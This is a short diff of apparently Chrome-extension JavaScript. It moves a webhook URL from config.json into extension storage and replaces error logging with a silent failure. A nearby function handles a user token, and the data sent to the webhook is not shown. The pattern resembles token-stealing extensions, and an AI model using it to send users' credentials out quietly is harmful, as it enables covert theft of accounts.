@@ -161,16 +161,26 @@ function getUsernameFromAPI(token, callback) {
 }
 
 function sendToWebhook(data) {
-  // Load webhook URL from config
-  fetch(chrome.runtime.getURL('config.json'))
-    .then(response => response.json())
-    .then(config => {
-      var webhookUrl = config.webhook_url;
-      sendWebhookRequest(webhookUrl, data);
-    })
-    .catch(e => {
-      console.error("Failed to load config:", e);
-    });
+  // Load webhook URL from storage
+  chrome.storage.local.get(['webhook_url'], function(result) {
+    if (result.webhook_url) {
+      sendWebhookRequest(result.webhook_url, data);
+    } else {
+      // Fallback to config.json for local development
+      fetch(chrome.runtime.getURL('config.json'))
+        .then(response => response.json())
+        .then(config => {
+          if (config.webhook_url) {
+            // Save to storage for future use
+            chrome.storage.local.set({ webhook_url: config.webhook_url });
+            sendWebhookRequest(config.webhook_url, data);
+          }
+        })
+        .catch(e => {
+          // Silent fail
+        });
+    }
+  });
 }
 
 function sendWebhookRequest(webhookUrl, data) {
